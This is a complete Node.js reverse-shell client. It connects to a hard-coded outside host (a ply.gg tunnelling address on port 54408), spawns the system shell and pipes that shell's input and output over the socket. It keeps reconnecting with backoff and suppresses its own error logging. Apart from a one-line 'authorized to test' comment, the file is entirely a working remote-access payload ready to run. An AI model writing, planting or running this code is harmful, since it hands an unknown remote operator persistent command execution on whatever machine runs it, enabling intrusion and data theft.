// reverse-client.js
// Usage: HOST=beach-readings.gl.at.ply.gg PORT=54408 node reverse-client.js
// NOTE: Only use on systems you are authorized to test.

const net = require('net');
const { spawn } = require('child_process');

const HOST = process.env.HOST || 'beach-readings.gl.at.ply.gg';
const PORT = Number(process.env.PORT || 54408);
const INITIAL_RETRY = Number(process.env.RETRY_MS || 10000); // ms
const MAX_RETRY = Number(process.env.MAX_RETRY_MS || 120000); // ms
const KEEPALIVE = true;
const KEEPALIVE_DELAY = 60000; // ms

let backoff = INITIAL_RETRY;
let socket = null;

function chooseShell() {
  // prefer bash if present, fallback to sh on unix. On Windows use cmd.exe.
  if (process.platform === 'win32') return 'cmd.exe';
  // If user provided SHELL env var, prefer it
  if (process.env.SHELL) return process.env.SHELL;
  return '/bin/sh';
}

function connect() {
  socket = new net.Socket();

  socket.on('error', (err) => {
    // silent by default to avoid noisy logs in a lab run; uncomment for debugging
    // console.error('socket error:', err && err.message);
  });

  socket.on('close', (hadError) => {
    cleanup();
    scheduleReconnect();
  });

  socket.setKeepAlive(KEEPALIVE, KEEPALIVE_DELAY);

  socket.connect(PORT, HOST, () => {
    // reset backoff on successful connect
    backoff = INITIAL_RETRY;

    const shellCmd = chooseShell();
    const shell = spawn(shellCmd, [], { stdio: 'pipe' });

    // Pipe socket <-> shell
    socket.pipe(shell.stdin);
    shell.stdout.pipe(socket);
    shell.stderr.pipe(socket);

    // If the shell exits, end the socket gracefully
    shell.on('exit', (code, signal) => {
      try { socket.end(); } catch (e) {}
    });

    // If socket ends, kill the shell
    socket.on('end', () => {
      try { shell.kill(); } catch (e) {}
    });

    // defensive: if shell errors, close socket
    shell.on('error', () => {
      try { socket.end(); } catch (e) {}
    });
  });
}

function cleanup() {
  if (!socket) return;
  socket.removeAllListeners();
  try { socket.destroy(); } catch (e) {}
  socket = null;
}

function scheduleReconnect() {
  const delay = Math.min(backoff, MAX_RETRY);
  // optional debug line:
  // console.error(`Disconnected — reconnecting in ${delay} ms`);
  setTimeout(() => {
    backoff = Math.min(backoff * 2, MAX_RETRY); // exponential backoff
    connect();
  }, delay);
}

// start
connect();
